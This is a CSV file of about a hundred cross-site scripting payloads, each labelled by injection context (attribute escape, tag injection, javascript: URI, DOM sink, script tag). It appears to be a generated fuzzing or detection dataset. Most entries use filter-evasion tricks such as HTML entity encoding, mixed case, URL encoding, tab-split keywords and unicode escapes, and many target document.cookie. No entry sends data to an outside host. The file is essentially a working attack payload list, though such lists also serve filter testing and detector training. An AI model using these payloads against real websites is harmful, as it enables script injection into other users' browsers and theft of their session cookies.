payload,context
""" onr&#101;p&#101;&#97;t=confirm(loc&#97;tion.h&#97;sh) """,attribute_escape
javascript:void(prompt(document.cookie)),js_uri
<img onerror=alert(location.hash)/>,tag_injection
%22 onfocus=confirm(document.cookie) autofocus=%22,attribute_escape
' oNbeGin=coNfiRm(1) ',attribute_escape
"location.href=""javascr	ipt:prompt(1)""",dom_sink
<script>prompt(docum&#101;nt.cooki&#101;)</script>,script_injection
' on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) ',attribute_escape
' onerror=prompt(document.cookie) ',attribute_escape
<img on&#97;nim&#97;tionc&#97;nc&#101;l=prompt(1)/>,tag_injection
""" onanimationiteration=prompt(location.hash) """,attribute_escape
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=aLerT(dOcuMenT.cOokIe)>"")",dom_sink
"""><img onbegin=confirm('XSS')>",tag_injection
<img onend=console.log(%27XSS%27)>,tag_injection
%3Cimg onanimationiteration=alert(location.hash)/%3E,tag_injection
J&#97;VasCriPt:AleRt(DocUmeNt.CooKie),js_uri
"' onr&#101;p&#101;&#97;t=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
"""><img onanimationend=alert('XSS')>",tag_injection
<imG oNenD=pRomPt(LocAtiOn.HasH)/>,tag_injection
<img onb&#101;gin=confirm('XSS')>,tag_injection
"""><Img onEnd=coNfiRm(DocUmeNt.DomAin)>",tag_injection
' oNanImaTioNenD=cOnsOle.loG(dOcuMenT.dOmaIn) ',attribute_escape
"""><img onerror=prompt(document.cookie)>",tag_injection
%22 onload=prompt(location.hash) %22,attribute_escape
<img on&#97;nim&#97;tion&#101;nd=confirm('XSS')>,tag_injection
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=&#97;l&#101;rt(1)>"")",dom_sink
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>"")",dom_sink
"%3Cimg onrepeat=alert(String.fromCharCode(88,83,83))%3E",tag_injection
<imG oNanImaTioNitEraTioN=cOnfIrm(doCumEnt.doMaiN)>,tag_injection
%27 onend=console.log(location.hash) %27,attribute_escape
"""%3E%3Cimg onrepeat=console.log(1)%3E",tag_injection
"""%3E%3Cimg onanimationiteration=alert(1)%3E",tag_injection
<img onanimationstart=\u0061lert(document.domain)/>,tag_injection
<img on&#97;nim&#97;tionst&#97;rt=consol&#101;.log(1)>,tag_injection
%22><img onbegin=console.log(location.hash)>,tag_injection
"""><Img onAniMatIonStaRt=ConSolE.lOg(1)>",tag_injection
%3Cimg onanimationiteration=confirm(document.cookie)/%3E,tag_injection
<img onrepeat=alert(location.hash)/>,tag_injection
"<imG oNanImaTioNenD=pRomPt(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection
<scRipT>/X/cOnfIrm(loCatIon.haSh)</sCriPt>,script_injection
"%3Cscript%3Econfirm(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
"""><img onend=prompt('XSS')>",tag_injection
"%3Cimg onerror=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
"""%3E%3Cimg onanimationiteration=prompt(location.hash)%3E",tag_injection
%3Cimg onload=console.log(document.cookie)%3E,tag_injection
"""%3E%3Cimg onerror=confirm(location.hash)%3E",tag_injection
""" onrepeat=\u0061lert(1) """,attribute_escape
"setTimeout(""console.log(document.domain)"",0)",dom_sink
"document.body.innerHTML=""<img src=x onerror=confirm(1)>""",dom_sink
"<img onanimationstart=confirm(String.fromCharCode(88,83,83))/>",tag_injection
<img onanimationiteration=prompt(location.hash)>,tag_injection
"location.href=""javascript:console.log(document.cookie)""",dom_sink
"""><img on&#101;nd=prompt(1)>",tag_injection
"""><img onend=\u0061lert('XSS')>",tag_injection
JavAscRipT:cOnfIrm(doCumEnt.coOkiE),js_uri
%3Cimg onrepeat=confirm(1)%3E,tag_injection
"""><Img onEnd=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
<img on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt('XSS')>,tag_injection
"""><img onr&#101;p&#101;&#97;t=confirm(docum&#101;nt.cooki&#101;)>",tag_injection
<scr	ipt>alert('XSS')</scr	ipt>,script_injection
' oNanImaTioNstArt=prOmpT(dOcuMenT.cOokIe) ',attribute_escape
<imG oNrePeaT=cOnfIrm(loCatIon.haSh)>,tag_injection
<imG oNloAd=AleRt(DocUmeNt.CooKie)>,tag_injection
""" on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt(1) """,attribute_escape
%3Cimg onbegin=prompt(document.domain)%3E,tag_injection
"<img onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
"""><img on&#97;nim&#97;tionit&#101;r&#97;tion=prompt('XSS')>",tag_injection
' on&#97;nim&#97;tion&#101;nd=confirm(1) ',attribute_escape
"""><img onbegin=\u0061lert(document.cookie)>",tag_injection
%22 onanimationiteration=alert(%27XSS%27) %22,attribute_escape
<img onanimationcancel=\u0061lert(1)/>,tag_injection
"<script>/x/\u0061lert(String.fromCharCode(88,83,83))</script>",script_injection
"document.write(""<img src=x onerror=\u0061lert(location.hash)>"")",dom_sink
<scRipT>/*/pRomPt(LocAtiOn.HasH)</scRipT>,script_injection
"<img onanimationend=alert(String.fromCharCode(88,83,83))/>",tag_injection
"""><img onlo&#97;d=consol&#101;.log('XSS')>",tag_injection
"%22><img onanimationend=alert(String.fromCharCode(88,83,83))>",tag_injection
""" oNerRor=alErt(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
%3Cimg onbegin=confirm(document.cookie)%3E,tag_injection
' onerror=prompt('XSS') ',attribute_escape
""" oNloAd=AleRt(LocAtiOn.HasH) """,attribute_escape
"""><img onb&#101;gin=confirm(docum&#101;nt.dom&#97;in)>",tag_injection
""" oNloAd=ConSolE.lOg(LocAtiOn.HasH) """,attribute_escape
JavAscRipT:cOnsOle.loG(dOcuMenT.cOokIe),js_uri
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=pRomPt(LocAtiOn.HasH)>""",dom_sink
<img onlo&#97;d=prompt('XSS')>,tag_injection
"' on&#101;rror=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
"' onr&#101;p&#101;&#97;t=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
""" oNanImaTioNenD=aLerT(dOcuMenT.cOokIe) """,attribute_escape
"document.write(""%3Cimg src=x onerror=console.log(document.cookie)%3E"")",dom_sink
' onend=confirm(document.cookie) ',attribute_escape
"""><img onerror=prompt(location.hash)>",tag_injection
<imG oNanImaTioNitEraTioN=aLerT(lOcaTioN.hAsh)/>,tag_injection
j&#97;vascr	ipt:console.log(location.hash),js_uri
"<imG oNrePeaT=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))/>",tag_injection
javascr	ipt:alert('XSS'),js_uri
%3Cimg onerror=alert(location.hash)/%3E,tag_injection
%3Cscript%3Eprompt(location.hash)%3C/script%3E,script_injection
document.body.innerHTML=%22<img src=x onerror=alert(document.domain)>%22,dom_sink
%27 onanimationiteration=confirm(1) %27,attribute_escape
""" oNloAd=ConFirM(lOcaTioN.hAsh) """,attribute_escape
"s&#101;tTim&#101;out(""confirm(docum&#101;nt.dom&#97;in)"",0)",dom_sink
